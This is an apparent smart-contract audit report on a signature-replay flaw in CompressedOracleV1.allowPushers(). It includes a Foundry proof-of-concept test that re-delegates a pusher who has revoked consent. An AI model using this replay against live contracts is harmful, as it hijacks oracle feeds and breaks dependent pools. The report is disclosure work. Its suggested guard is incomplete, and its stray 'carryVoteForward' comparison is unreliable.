### Title
`allowPushers()` Lacks a Post-Revocation Replay Guard, Allowing a Creator to Forcibly Re-Delegate a Pusher Who Has Revoked Consent — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers()` does not check whether a pusher has already revoked their delegation before overwriting `namespaceRemapping[pusher]`. A creator who holds a valid (non-expired) consent signature can replay it after the pusher has called `revokePusher()`, silently re-establishing the delegation and redirecting the pusher's price data back into the creator's namespace against the pusher's will. The NatSpec comment on the function explicitly identifies this risk and claims the deadline prevents it — but the deadline only limits the window; it does not prevent re-establishment within that window.

---

### Finding Description

`allowPushers()` is the EOA-pusher delegation path in `CompressedOracleV1`. A pusher signs an EIP-191 consent message binding `(chainid, address(this), deadline, pusher, creator)`, and the creator calls `allowPushers()` to write `namespaceRemapping[pusher] = creator`. After that, every `fallback()` push from the pusher lands in the creator's namespace rather than the pusher's own. [1](#0-0) 

The function's own NatSpec comment acknowledges the replay-after-revoke risk and states the deadline is the mitigation:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [2](#0-1) 

However, the deadline only prevents replay **after** the deadline expires. Within the deadline window, the creator can call `allowPushers()` again with the exact same signature and the same `deadline` value, and the function will succeed — because the only checks are `_ensureDeadline(deadline)` and ECDSA recovery. There is no check that `namespaceRemapping[pusher] == address(0)` (i.e., that the pusher has not already revoked). [3](#0-2) 

`revokePusher()` clears the mapping to `address(0)`: [4](#0-3) 

But there is nothing that invalidates the old signature. The creator can immediately replay it.

The `fallback()` push path resolves the namespace from `namespaceRemapping[msg.sender]`, falling back to the pusher's own namespace only when the mapping is zero: [5](#0-4) 

So after the creator replays the signature, the pusher's subsequent `fallback()` calls land in the creator's namespace again, not the pusher's own.

**The most damaging scenario** is a namespace hijack across two creators:

1. Pusher signs consent for **Creator A** with `deadline = T + 1 day`.
2. Creator A calls `allowPushers()` → `namespaceRemapping[pusher] = creatorA`.
3. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Pusher signs fresh consent for **Creator B** with `deadline = T + 2 days`.
5. Creator B calls `allowPushers()` → `namespaceRemapping[pusher] = creatorB`.
6. Creator A replays the old (still-valid) signature → `namespaceRemapping[pusher] = creatorA` again.

Now the pusher's data flows into Creator A's namespace. Creator B's pools, which read from Creator B's namespace (via `feedIdOf(creatorB, slotIndex, positionIndex)`), receive a timestamp of 0 (never-pushed state) and every consumer rejects it as stale. Creator A's pools receive price data from a pusher who has explicitly revoked consent and re-delegated elsewhere.

This is the direct analog to `carryVoteForward()` missing `_checkPeriodVoted()`: a function that should check "has this already been revoked?" before overwriting state, but doesn't.

---

### Impact Explanation

**Bad-price execution / broken core pool functionality.** Creator B's pools lose their live price feed — `getOracleData()` returns `timestampMs = 0`, which every price provider rejects as stale, causing swaps to revert. Creator A's pools receive price data from a pusher who has revoked consent and may now be pushing data for a different asset or market, constituting an unauthorized or misattributed oracle quote reaching live pool swaps.

The `namespaceRemapping` invariant — "a pusher who has revoked their delegation pushes into their own namespace" — is broken. The `revokePusher()` function is rendered ineffective for the duration of any outstanding valid signature.

---

### Likelihood Explanation

**Medium.** The attack requires the creator to hold a valid (non-expired) consent signature. In normal operation, pushers sign consent with deadlines of hours to days (the test suite uses `block.timestamp + 1 days`). Any creator who received a consent signature before the pusher revoked can replay it within that window. The pusher has no on-chain mechanism to invalidate the signature before the deadline expires.

---

### Recommendation

Add a guard in `allowPushers()` that rejects the call if the pusher is already delegated to a different creator, or if the pusher has revoked (mapping is `address(0)` after a prior delegation). The cleanest fix is to require that `namespaceRemapping[pusher] == address(0)` before writing, so that re-delegation always requires a fresh signature obtained after the revocation:

```solidity
// Inside the loop, after the self-remapping check:
address current = namespaceRemapping[pusher];
if (current != address(0) && current != msg.sender) {
    revert AlreadyDelegated(pusher, current);
}
// ... ECDSA recovery ...
namespaceRemapping[pusher] = msg.sender;
```

Alternatively, introduce a per-pusher nonce that is incremented on `revokePusher()` and included in the signed message, so any pre-revocation signature is automatically invalidated.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from
    "smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayAfterRevokePoC is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creatorA = address(0xAAAA);
    address creatorB = address(0xBBBB);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent for Creator A
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creatorA))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator A delegates pusher
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorA);

        // 3. Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // 4. Pusher re-delegates to Creator B (fresh consent)
        uint256 deadline2 = block.timestamp + 2 days;
        bytes32 digest2 = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline2, pusher, creatorB))
        );
        (v, r, s) = vm.sign(PUSHER_KEY, digest2);
        sigs[0] = abi.encodePacked(r, s, v);
        vm.prank(creatorB);
        oracle.allowPushers(deadline2, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorB);

        // 5. Creator A replays old signature — HIJACK
        sigs[0] = sig; // original sig for creatorA, still within deadline
        vm.prank(creatorA);
        oracle.allowPushers(deadline, pushers, sigs); // succeeds — no guard!

        // Pusher's data now flows to Creator A, not Creator B
        assertEq(oracle.namespaceRemapping(pusher), creatorA,
            "Creator A hijacked the pusher from Creator B");
        // Creator B's pools now receive stale/zero prices; Creator A's pools
        // receive unauthorized price data from a pusher who revoked consent.
    }
}
``` [3](#0-2) [4](#0-3) [6](#0-5)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-212)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-321)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }
```
